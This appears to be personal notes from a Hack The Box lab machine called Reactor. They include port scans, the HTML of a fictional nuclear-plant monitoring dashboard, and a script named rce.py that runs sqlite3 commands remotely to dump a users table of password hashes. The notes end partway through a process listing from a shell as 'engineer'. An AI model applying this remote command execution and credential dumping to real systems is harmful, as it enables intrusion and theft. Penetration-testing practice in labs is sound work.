```shell

┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 -Pn 10.129.15.173 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-03 11:17 -0400
Warning: 10.129.15.173 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.15.173
Host is up (0.23s latency).
Not shown: 64363 closed tcp ports (reset), 1170 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 49.64 seconds

┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.15.173 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.15.173:22
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-03 11:19 -0400
Initiating Ping Scan at 11:19
Scanning 10.129.15.173 [4 ports]
Completed Ping Scan at 11:19, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:19
Completed Parallel DNS resolution of 1 host. at 11:19, 0.51s elapsed
DNS resolution of 1 IPs took 0.51s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:19
Scanning 10.129.15.173 [1 port]
Discovered open port 22/tcp on 10.129.15.173
Completed SYN Stealth Scan at 11:19, 0.23s elapsed (1 total ports)
Nmap scan report for 10.129.15.173
Host is up, received echo-reply ttl 63 (0.21s latency).
Scanned at 2026-06-03 11:19:57 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)

                                                                                          
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 22,3000 10.129.15.173          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-03 11:21 -0400
Nmap scan report for 10.129.15.173
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Wed, 03 Jun 2026 15:21:36 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Wed, 03 Jun 2026 15:21:39 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=6/3%Time=6A20467C%P=x86_64-pc-linux-gnu%r(Get
SF:Request,24EA,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-St
SF:ate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x20
SF:Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\r
SF:\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nCa
SF:che-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20171
SF:75\r\nDate:\x20Wed,\x2003\x20Jun\x202026\x2015:21:36\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta\
SF:x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\"
SF:/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/>
SF:<link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20h
SF:ref=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20s
SF:rc=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\"
SF:></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.j
SF:s\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOption
SF:s,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rout
SF:er-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch
SF:\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no
SF:-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Wed,\
SF:x2003\x20Jun\x202026\x2015:21:39\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RS
SF:C,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-S
SF:egment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x2
SF:0private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\
SF:nDate:\x20Wed,\x2003\x20Jun\x202026\x2015:21:39\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Connection:\x20close\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   233.62 ms 10.10.14.1
2   234.02 ms 10.129.15.173

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.53 seconds
```


![[Pasted image 20260603182951.png]]


```
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.129.15.173:3000/ 
<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script src="/_next/static/chunks/main-app-4fbb4b1f318e39a0.js" async=""></script><title>ReactorWatch | Core Monitoring System</title><meta name="description" content="Nuclear Reactor Core Monitoring Dashboard"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div><header class="header"><div class="logo"><div class="logo-icon"></div><div class="logo-text"><h1>REACTORWATCH</h1><span>CORE MONITORING SYSTEM v3.2.1</span></div></div><div class="status-badge"><div class="status-dot"></div><span>NOMINAL</span></div></header><div class="container"><div class="dashboard-grid"><div class="panel core-status"><div class="panel-header"><span class="panel-title">Core Status</span><div class="panel-indicator"></div></div><div class="core-visual"><div class="core-ring"></div><div class="core-ring"></div><div class="core-ring"></div><div class="core-center">OK</div></div><div class="core-stats"><div class="stat-item"><div class="stat-label">REACTOR POWER</div><div class="stat-value">98.2%</div></div><div class="stat-item"><div class="stat-label">NEUTRON FLUX</div><div class="stat-value">2.4E13</div></div><div class="stat-item"><div class="stat-label">CONTROL RODS</div><div class="stat-value">42/50</div></div><div class="stat-item"><div class="stat-label">CRITICALITY</div><div class="stat-value warning">1.0002</div></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Core Temp</span><div class="panel-indicator"></div></div><div class="metric-value">324°<span class="metric-unit">C</span></div><div class="metric-bar"><div class="metric-bar-fill" style="width:65%"></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Pressure</span><div class="panel-indicator"></div></div><div class="metric-value">155<span class="metric-unit">bar</span></div><div class="metric-bar"><div class="metric-bar-fill" style="width:72%"></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Coolant Flow</span><div class="panel-indicator"></div></div><div class="metric-value caution">18.4<span class="metric-unit">k m³/h</span></div><div class="metric-bar"><div class="metric-bar-fill caution" style="width:84%"></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Turbine Output</span><div class="panel-indicator"></div></div><div class="metric-value">1.21<span class="metric-unit">GW</span></div><div class="metric-bar"><div class="metric-bar-fill" style="width:91%"></div></div></div><div class="panel log-panel"><div class="panel-header"><span class="panel-title">System Logs</span><div class="panel-indicator"></div></div><div class="log-entries"><div class="log-entry"><span class="log-time">14:32:01</span><span class="log-level ok">OK</span><span class="log-message">Primary coolant loop operating within parameters</span></div><div class="log-entry"><span class="log-time">14:28:45</span><span class="log-level info">INFO</span><span class="log-message">Scheduled maintenance completed on turbine #2</span></div><div class="log-entry"><span class="log-time">14:15:22</span><span class="log-level warn">WARN</span><span class="log-message">Minor fluctuation detected in secondary loop pressure</span></div><div class="log-entry"><span class="log-time">14:02:18</span><span class="log-level ok">OK</span><span class="log-message">Control rod position calibration successful</span></div><div class="log-entry"><span class="log-time">13:45:33</span><span class="log-level info">INFO</span><span class="log-message">Shift change: Day crew reporting for duty</span></div></div></div><div class="panel staff-panel"><div class="panel-header"><span class="panel-title">On-Site Personnel</span><div class="panel-indicator"></div></div><div class="staff-list"><div class="staff-member"><div class="staff-avatar">DR</div><div class="staff-info"><div class="staff-name">Dr. Elena Rodriguez</div><div class="staff-role">Lead Nuclear Engineer</div></div><div class="staff-status online">ONLINE</div></div><div class="staff-member"><div class="staff-avatar">MK</div><div class="staff-info"><div class="staff-name">Marcus Kim</div><div class="staff-role">Senior Technician</div></div><div class="staff-status online">ONLINE</div></div><div class="staff-member"><div class="staff-avatar">JT</div><div class="staff-info"><div class="staff-name">James Thompson</div><div class="staff-role">Safety Officer</div></div><div class="staff-status offline">OFFLINE</div></div></div></div></div><footer class="footer">REACTORWATCH™ © 2025 NUCLEAR DYNAMICS CORP. | FACILITY: SITE-7 | CLASSIFICATION: RESTRICTED</footer></div></div><script src="/_next/static/chunks/webpack-db0a529a99835594.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"2:\"$Sreact.fragment\"\n3:I[5244,[],\"\"]\n4:I[3866,[],\"\"]\n5:I[6213,[],\"OutletBoundary\"]\n7:I[6213,[],\"MetadataBoundary\"]\n9:I[6213,[],\"ViewportBoundary\"]\nb:I[4835,[],\"\"]\n1:HL[\"/_next/static/css/414e1be982bc8557.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"L3bimJe_3LvBcFWAnK5L4\",\"p\":\"\",\"c\":[\"\",\"\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$2\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/414e1be982bc8557.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[]}]}]}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$2\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"children\":[[\"$\",\"header\",null,{\"className\":\"header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"logo\",\"children\":[[\"$\",\"div\",null,{\"className\":\"logo-icon\"}],[\"$\",\"div\",null,{\"className\":\"logo-text\",\"children\":[[\"$\",\"h1\",null,{\"children\":\"REACTORWATCH\"}],[\"$\",\"span\",null,{\"children\":\"CORE MONITORING SYSTEM v3.2.1\"}]]}]]}],[\"$\",\"div\",null,{\"className\":\"status-badge\",\"children\":[[\"$\",\"div\",null,{\"className\":\"status-dot\"}],[\"$\",\"span\",null,{\"children\":\"NOMINAL\"}]]}]]}],[\"$\",\"div\",null,{\"className\":\"container\",\"children\":[[\"$\",\"div\",null,{\"className\":\"dashboard-grid\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel core-status\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Core Status\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"core-visual\",\"children\":[[\"$\",\"div\",null,{\"className\":\"core-ring\"}],[\"$\",\"div\",null,{\"className\":\"core-ring\"}],[\"$\",\"div\",null,{\"className\":\"core-ring\"}],[\"$\",\"div\",null,{\"className\":\"core-center\",\"children\":\"OK\"}]]}],[\"$\",\"div\",null,{\"className\":\"core-stats\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"REACTOR POWER\"}],[\"$\",\"div\",null,{\"className\":\"stat-value\",\"children\":\"98.2%\"}]]}],[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"NEUTRON FLUX\"}],[\"$\",\"div\",null,{\"className\":\"stat-value\",\"children\":\"2.4E13\"}]]}],[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"CONTROL RODS\"}],[\"$\",\"div\",null,{\"className\":\"stat-value\",\"children\":\"42/50\"}]]}],[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"CRITICALITY\"}],[\"$\",\"div\",null,{\"className\":\"stat-value warning\",\"children\":\"1.0002\"}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Core Temp\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value\",\"children\":[\"324°\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"C\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill\",\"style\":{\"width\":\"65%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Pressure\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value\",\"children\":[\"155\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"bar\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill\",\"style\":{\"width\":\"72%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Coolant Flow\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value caution\",\"children\":[\"18.4\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"k m³/h\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill caution\",\"style\":{\"width\":\"84%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Turbine Output\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value\",\"children\":[\"1.21\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"GW\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill\",\"style\":{\"width\":\"91%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel log-panel\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"System Logs\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entries\",\"children\":[[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:32:01\"}],[\"$\",\"span\",null,{\"className\":\"log-level ok\",\"children\":\"OK\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Primary coolant loop operating within parameters\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:28:45\"}],[\"$\",\"span\",null,{\"className\":\"log-level info\",\"children\":\"INFO\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Scheduled maintenance completed on turbine #2\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:15:22\"}],[\"$\",\"span\",null,{\"className\":\"log-level warn\",\"children\":\"WARN\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Minor fluctuation detected in secondary loop pressure\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:02:18\"}],[\"$\",\"span\",null,{\"className\":\"log-level ok\",\"children\":\"OK\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Control rod position calibration successful\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"13:45:33\"}],[\"$\",\"span\",null,{\"className\":\"log-level info\",\"children\":\"INFO\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Shift change: Day crew reporting for duty\"}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"panel staff-panel\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"On-Site Personnel\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-list\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-member\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-avatar\",\"children\":\"DR\"}],[\"$\",\"div\",null,{\"className\":\"staff-info\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-name\",\"children\":\"Dr. Elena Rodriguez\"}],[\"$\",\"div\",null,{\"className\":\"staff-role\",\"children\":\"Lead Nuclear Engineer\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-status online\",\"children\":\"ONLINE\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-member\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-avatar\",\"children\":\"MK\"}],[\"$\",\"div\",null,{\"className\":\"staff-info\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-name\",\"children\":\"Marcus Kim\"}],[\"$\",\"div\",null,{\"className\":\"staff-role\",\"children\":\"Senior Technician\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-status online\",\"children\":\"ONLINE\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-member\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-avatar\",\"children\":\"JT\"}],[\"$\",\"div\",null,{\"className\":\"staff-info\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-name\",\"children\":\"James Thompson\"}],[\"$\",\"div\",null,{\"className\":\"staff-role\",\"children\":\"Safety Officer\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-status offline\",\"children\":\"OFFLINE\"}]]}]]}]]}]]}],[\"$\",\"footer\",null,{\"className\":\"footer\",\"children\":\"REACTORWATCH™ © 2025 NUCLEAR DYNAMICS CORP. | FACILITY: SITE-7 | CLASSIFICATION: RESTRICTED\"}]]}]]}],null,[\"$\",\"$L5\",null,{\"children\":\"$L6\"}]]}],{},null]},null],[\"$\",\"$2\",\"h\",{\"children\":[null,[\"$\",\"$2\",\"odCkXeObJtnWLexaH-Dfw\",{\"children\":[[\"$\",\"$L7\",null,{\"children\":\"$L8\"}],[\"$\",\"$L9\",null,{\"children\":\"$La\"}],null]}]]}]]],\"m\":\"$undefined\",\"G\":[\"$b\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n8:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"1\",{\"children\":\"ReactorWatch | Core Monitoring System\"}],[\"$\",\"meta\",\"2\",{\"name\":\"description\",\"content\":\"Nuclear Reactor Core Monitoring Dashboard\"}]]\n"])</script><script>self.__next_f.push([1,"6:null\n"])</script></body></html>
```


```
                                                                                          
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 rce.py "sqlite3 /opt/reactor-app/reactor.db .tables"               
sensor_logs  users
                                                                                          
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 rce.py "sqlite3 /opt/reactor-app/reactor.db 'SELECT * FROM USERS;'"
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb

```


```shell
#
engineer@reactor:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3  22128 13276 ?        Ss   14:50   0:01 /sbin/init
root           2  0.0  0.0      0     0 ?        S    14:50   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        S    14:50   0:00 [pool_workqueue_release
root           4  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-rcu_g]
root           5  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-rcu_p]
root           6  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-slub_]
root           7  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-netns]
root           8  0.0  0.0      0     0 ?        I    14:50   0:02 [kworker/0:0-cgroup_fre
root          10  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/0:0H-events_hi
root          12  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-mm_pe]
root          13  0.0  0.0      0     0 ?        I    14:50   0:00 [rcu_tasks_kthread]
root          14  0.0  0.0      0     0 ?        I    14:50   0:00 [rcu_tasks_rude_kthread
root          15  0.0  0.0      0     0 ?        I    14:50   0:00 [rcu_tasks_trace_kthrea
root          16  0.0  0.0      0     0 ?        S    14:50   0:00 [ksoftirqd/0]
root          17  0.0  0.0      0     0 ?        I    14:50   0:00 [rcu_preempt]
root          18  0.0  0.0      0     0 ?        S    14:50   0:00 [migration/0]
root          19  0.0  0.0      0     0 ?        S    14:50   0:00 [idle_inject/0]
root          20  0.0  0.0      0     0 ?        S    14:50   0:00 [cpuhp/0]
root          21  0.0  0.0      0     0 ?        S    14:50   0:00 [cpuhp/1]
root          22  0.0  0.0      0     0 ?        S    14:50   0:00 [idle_inject/1]
root          23  0.0  0.0      0     0 ?        S    14:50   0:00 [migration/1]
root          24  0.0  0.0      0     0 ?        S    14:50   0:00 [ksoftirqd/1]
root          26  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/1:0H-kblockd]
root          29  0.0  0.0      0     0 ?        S    14:50   0:00 [kdevtmpfs]
root          30  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-inet_]
root          31  0.0  0.0      0     0 ?        S    14:50   0:00 [kauditd]
root          33  0.0  0.0      0     0 ?        S    14:50   0:00 [khungtaskd]
root          34  0.0  0.0      0     0 ?        S    14:50   0:00 [oom_reaper]
root          36  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-write]
root          38  0.0  0.0      0     0 ?        S    14:50   0:00 [kcompactd0]
root          39  0.0  0.0      0     0 ?        SN   14:50   0:00 [ksmd]
root          41  0.0  0.0      0     0 ?        I    14:50   0:02 [kworker/1:2-events]
root          42  0.0  0.0      0     0 ?        SN   14:50   0:00 [khugepaged]
root          43  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-kinte]
root          44  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-kbloc]
root          45  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-blkcg]
root          46  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/9-acpi]
root          47  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-tpm_d]
root          48  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-ata_s]
root          49  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-md]
root          50  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-md_bi]
root          51  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-edac-]
root          52  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-devfr]
